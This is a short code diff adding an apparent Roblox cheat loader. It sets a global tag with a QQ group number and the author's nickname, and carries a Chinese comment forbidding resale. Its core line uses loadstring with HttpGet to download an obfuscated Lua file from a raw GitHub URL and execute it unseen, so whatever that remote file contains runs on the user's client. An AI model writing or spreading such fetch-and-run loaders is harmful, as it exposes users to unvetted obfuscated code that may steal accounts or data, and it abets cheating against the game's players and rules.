@@ -1,0 +1,4 @@
+getgenv().LK="QQ群:1064067939"
+LK = "靓坤nb"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xcmsnd/-/refs/heads/main/obfuscated_script-1758337497437.lua.txt"))()
+--严禁贩卖该脚本,靓坤一人制作
